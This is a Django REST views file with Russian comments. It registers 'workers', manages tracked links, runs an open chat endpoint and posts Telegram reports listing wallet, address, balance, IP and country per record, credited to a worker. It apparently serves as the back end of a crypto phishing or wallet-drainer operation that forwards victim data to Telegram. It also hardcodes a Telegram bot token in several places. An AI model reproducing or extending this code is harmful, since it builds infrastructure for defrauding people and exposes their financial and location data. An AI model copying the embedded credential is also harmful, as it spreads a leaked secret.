from rest_framework import generics, status, viewsets
from rest_framework.response import Response
from rest_framework.permissions import IsAuthenticated, AllowAny
from rest_framework_simplejwt.tokens import RefreshToken
from rest_framework_simplejwt.views import TokenObtainPairView
from rest_framework.views import APIView
from ipware import get_client_ip
from django.utils.text import slugify
from django.urls import reverse
from asgiref.sync import async_to_sync, sync_to_async
import time
import aiohttp
import requests
from rest_framework.permissions import IsAuthenticated
from .models import (Worker, CreateLink, Chat, ReboundTelegram, UserFinishInfo)
from .permissions import IsAdminOrReadOnly
from .serializers import (
    WorkerSerializer,
    CreateLinkSerializer,
    AuthTokenObtainPairSerializer,
    TelegramMessageSerializer,
    ChatSerializer, UserFinishInfoSerializer, GeneralMessageSerializer, ReboundTelegramSerializer,
    ReboundTelegramGeneralSerializer,
)

import os
import django

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'rest.settings')
os.environ["DJANGO_ALLOW_ASYNC_UNSAFE"] = "true"
django.setup()


class RegisterUserView(generics.CreateAPIView):
    queryset = Worker.objects.all()
    serializer_class = WorkerSerializer
    permission_classes = [AllowAny]

    def post(self, request, *args, **kwargs):
        serializer = self.get_serializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        user = serializer.save()

        refresh = RefreshToken.for_user(user)

        return Response({
            'id': user.id,
            'refresh': str(refresh),
            'access': str(refresh.access_token),
        })


class AuthTokenObtainPairView(TokenObtainPairView):
    serializer_class = AuthTokenObtainPairSerializer


class CreateLinkListCreateView(generics.ListCreateAPIView):
    queryset = CreateLink.objects.all()
    serializer_class = CreateLinkSerializer
    permission_classes = [IsAuthenticated]

    def get(self, request, *args, **kwargs):
        pk_param = request.GET.get('pk')
        queryset = self.get_queryset()
        if pk_param:
            queryset = queryset.filter(id=pk_param)
        queryset = self.filter_queryset(queryset)
        serializer = self.get_serializer(queryset, many=True)
        return Response(serializer.data)

    def perform_create(self, serializer, slug=None):
        if slug:
            serializer.validated_data['slug'] = slugify(slug)
        serializer.save()
    
    def create(self, request, *args, **kwargs):
        serializer = self.get_serializer(data=request.data)
        serializer.is_valid(raise_exception=True)

        link = serializer.validated_data.get('link')
        if link:
            link = link.replace("http://", "")
            slug = slugify(link)
            serializer.validated_data['slug'] = slug

        self.perform_create(serializer)
        
        headers = self.get_success_headers(serializer.data)
        return Response(serializer.data, status=status.HTTP_201_CREATED, headers=headers)


# VIEW ALL LINK
class LinkListView(generics.ListAPIView):
    queryset = CreateLink.objects.all()
    serializer_class = CreateLinkSerializer
    permission_classes = (IsAuthenticated,)
    
    def get_queryset(self):
        queryset = super().get_queryset()
        pk_param = self.request.GET.get('pk')
        if pk_param:
            queryset = queryset.filter(id=pk_param)
        return queryset


class LinkDetailsView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, slug):
        try:
            link = CreateLink.objects.get(slug=slug)
            serializer = CreateLinkSerializer(link)
            return Response(serializer.data)
        except CreateLink.DoesNotExist:
            return Response({"message": "Link not found"}, status=404)
        

# ALL URL
class URLListAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        slugs = CreateLink.objects.values_list('slug', flat=True)
        slugs = [slug for slug in slugs if slug is not None]
        
        # Собираем полные URL на основе slug
        full_urls = [request.build_absolute_uri(reverse('link_details', kwargs={'slug': slug})) for slug in slugs]
        
        return Response(full_urls, status=status.HTTP_200_OK)


# ! PERMISSION
class LinkDestroyView(generics.DestroyAPIView):
    queryset = CreateLink.objects.all()
    serializer_class = CreateLinkSerializer
    permission_classes = [IsAuthenticated]
    
    def destroy(self, request, *args, **kwargs):
        instance = self.get_object()
        self.perform_destroy(instance)
        return Response({"message": "Ссылка была успешно удалена."}, status=status.HTTP_204_NO_CONTENT)


class ChatViewSet(viewsets.ModelViewSet):
    queryset = Chat.objects.all()
    serializer_class = ChatSerializer
    permission_classes = [AllowAny]

    def create(self, request, *args, **kwargs):
        message = request.data.get('message')
        link_id = request.data.get('link')
        worker_id = request.data.get('worker')
        is_worker = request.data.get('is_worker')

        # Создание нового сообщения
        new_message = Chat.objects.create(
            message=message,
            link_id=link_id,
            worker_id=worker_id,
            is_worker=is_worker
        )

        return Response(self.get_serializer(new_message).data, status=status.HTTP_201_CREATED)

    def get_new_messages(self, request):
        last_message_id = request.query_params.get('last_message_id')
        if last_message_id:
            new_messages = Chat.objects.filter(id__gt=last_message_id)
        else:
            new_messages = Chat.objects.all()

        serializer = ChatSerializer(new_messages, many=True)
        return Response(serializer.data)


class GetNewMessages(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request):
        last_message_id = request.query_params.get('last_message_id')
        # Здесь вы должны реализовать логику получения новых сообщений
        # Вместо sleep используйте реальную логику получения сообщений
        time.sleep(2)
        
        # Пример возвращаемых новых сообщений
        new_messages = [
            {'id': 1, 'message': 'Новое сообщение 1'},
            {'id': 2, 'message': 'Новое сообщение 2'}
        ]
        return Response(new_messages, status=status.HTTP_200_OK)


class SendTelegramMessageView(APIView):
    permission_classes = (IsAuthenticated,)

    async def get_username_by_id(self, user_id, bot_token):
        async with aiohttp.ClientSession() as session:
            async with session.get(
                    f"https://api.telegram.org/bot{bot_token}/getChat",
                    params={"chat_id": user_id}
            ) as response:
                data = await response.json()
                if response.status == 200 and data.get("ok"):
                    return data["result"]["username"]
                return None

    async def send_telegram_message(self, user_id, message):
        try:
            telegram_token = '6618511647:AAEin9mETWRzdb8Z4OlUFf0rkgyH29nZGdI'  # Ваш токен бота Telegram
            url = f"https://api.telegram.org/bot{telegram_token}/sendMessage"
            data = {
                'chat_id': user_id,     # Идентификатор пользователя для личного сообщения
                'text': message,
            }
            async with aiohttp.ClientSession() as session:
                async with session.post(url, data=data) as response:
                    response_data = await response.json()
                    if response.status == 200 and response_data.get('ok'):
                        return {"message": "Сообщение успешно отправлено в Telegram!"}
                    else:
                        return {"error": "Ошибка при отправке сообщения в Telegram."}
        except Exception as e:
            return {"error": f"Произошла ошибка: {str(e)}"}

    @async_to_sync
    async def post(self, request, *args, **kwargs):
        serializer = TelegramMessageSerializer(data=request.data)
        if serializer.is_valid():
            user_id = serializer.validated_data['user_id']
            creator_id = serializer.validated_data['creator_id']  # Предположим, что вы получаете user_id
            # Получаем объекты из модели ReboundTelegram только для указанного пользователя
            user_objects = ReboundTelegram.objects.filter(creator_id=creator_id)

            if user_objects.exists():
                # Получаем имя пользователя Telegram
                telegram_token = '6618511647:AAEin9mETWRzdb8Z4OlUFf0rkgyH29nZGdI'  # Ваш токен бота Telegram
                username = await self.get_username_by_id(user_id, telegram_token)
                ip = self.request.META.get('REMOTE_ADDR')
                # Формируем сообщение с данными из объектов только для указанного пользователя
                message_data = ""
                for obj in user_objects:
                    message_data += f"\u2757 Статус: {obj.status}\n\U0001F6E5 Платформа: {obj.platform}\n" \
                                    f"\u25AA Кошелек: {obj.wallet}\n\u25AA Адрес: {obj.address}\n" \
                                    f"\u2753 Баланс: {obj.balance}\n\U0001F30F " \
                                    f"IP: {ip}\n\U0001F3F3 Страна: {obj.country}\n" \
                                    f"\U0001F477 Worker: @{username} \n\n\n"

                # Объединяем данные из модели с указанным сообщением
                full_message = f"{message_data}"
            else:
                # Если нет данных для указанного пользователя, используем только указанное сообщение
                full_message = "Нет данных"

            # Отправляем сообщение в Telegram
            response_data = await self.send_telegram_message(user_id, full_message)

            if 'error' in response_data:
                return Response(response_data, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
            else:
                return Response(response_data)
        else:
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)


class GeneralKnock(APIView):
    permission_classes = (IsAuthenticated,)

    async def get_username_by_id(self, user_id, bot_token):
        async with aiohttp.ClientSession() as session:
            async with session.get(
                    f"https://api.telegram.org/bot{bot_token}/getChat",
                    params={"chat_id": user_id}
            ) as response:
                data = await response.json()
                if response.status == 200 and data.get("ok"):
                    return data["result"]["username"]
                return None

    async def send_telegram_message(self, chat_id, message):
        try:
            telegram_token = '6618511647:AAEin9mETWRzdb8Z4OlUFf0rkgyH29nZGdI'  # Ваш токен бота Telegram
            url = f"https://api.telegram.org/bot{telegram_token}/sendMessage"
            data = {
                'chat_id': chat_id,  # Идентификатор пользователя для личного сообщения
                'text': message,
            }
            async with aiohttp.ClientSession() as session:
                async with session.post(url, data=data) as response:
                    response_data = await response.json()
                    if response.status == 200 and response_data.get('ok'):
                        return {"message": "Сообщение успешно отправлено в Telegram!"}
                    else:
                        return {"error": "Ошибка при отправке сообщения в Telegram."}
        except Exception as e:
            return {"error": f"Произошла ошибка: {str(e)}"}

    @async_to_sync
    async def post(self, request, *args, **kwargs):
        serializer = GeneralMessageSerializer(data=request.data)
        if serializer.is_valid():
            user_id = serializer.validated_data['user_id']
            chat_id = serializer.validated_data['chat_id']
            creator_id = serializer.validated_data['creator_id']  # Предположим, что вы получаете user_id
            # Получаем объекты из модели ReboundTelegram только для указанного пользователя
            user_objects = ReboundTelegram.objects.filter(creator_id=creator_id)

            if user_objects.exists():
                # Получаем имя пользователя Telegram
                telegram_token = ''  # Ваш токен бота Telegram
                username = await self.get_username_by_id(user_id, telegram_token)
                ip = self.request.META.get('REMOTE_ADDR')
                # Формируем сообщение с данными из объектов только для указанного пользователя
                message_data = ""
                for obj in user_objects:
                    message_data += f"\u2757 Статус: {obj.status}\n" \
                                    f"\U0001F477 Worker: @{username} \n"

                # Объединяем данные из модели с указанным сообщением
                full_message = f"{message_data}"
            else:
                # Если нет данных для указанного пользователя, используем только указанное сообщение
                full_message = "Нет данных"

            # Отправляем сообщение в Telegram
            response_data = await self.send_telegram_message(chat_id, full_message)

            if 'error' in response_data:
                return Response(response_data, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
            else:
                return Response(response_data)
        else:
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)


class UserFinishInfoAPIList(generics.ListCreateAPIView):
    queryset = UserFinishInfo.objects.all()
    serializer_class = UserFinishInfoSerializer
    permission_classes = (IsAuthenticated,)


class UserFinishInfoAPIDestroy(generics.RetrieveDestroyAPIView):
    queryset = UserFinishInfo.objects.all()
    serializer_class = UserFinishInfoSerializer
    permission_classes = (IsAuthenticated,)


class ReboundTelegramAPIList(generics.ListCreateAPIView):
    queryset = ReboundTelegram.objects.all()
    serializer_class = ReboundTelegramGeneralSerializer
    permission_classes = (IsAuthenticated,)


class ReboundTelegramAPIDestroy(generics.RetrieveDestroyAPIView):
    queryset = UserFinishInfo.objects.all()
    serializer_class = ReboundTelegramGeneralSerializer
    permission_classes = (IsAuthenticated,)
